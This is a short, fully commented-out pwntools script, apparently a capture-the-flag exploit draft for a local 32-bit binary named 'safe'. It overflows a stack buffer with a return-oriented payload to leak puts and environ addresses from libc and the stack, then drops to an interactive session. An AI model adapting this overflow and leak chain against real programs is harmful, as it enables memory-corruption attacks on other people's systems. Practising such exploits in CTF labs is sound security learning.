from pwn import *
# context(log_level='debug')
# p = process('./pwn/safe')
# elf = ELF('./pwn/safe')
# lib = ELF('/lib/i386-linux-gnu/libc.so.6')
#
# puts_plt = elf.plt['puts']
# puts_got = elf.got['puts']
# main_addr = elf.sym['main']
# payload = b'a' * 1036 + p32(puts_plt) + p32(main_addr) + p32(puts_got)
# gdb.attach(p)
# pause()
# p.sendline(payload)
# puts_addr = u32(p.recvuntil(b'\xf7')[-4:])
# print(hex(puts_addr))
# base_addr = puts_addr - lib.symbols['puts']
# print(hex(base_addr))
# environ_addr = base_addr + lib.symbols['environ']
# payload = b'a' * 1036 + p32(puts_plt) + p32(0x08048828) + p32(environ_addr)
# # gdb.attach(p)
#
# p.sendline(payload)
# stack_addr = u32(p.recvuntil(b'\xf7')[-4:])
# print(hex(stack_addr))
# p.interactive()

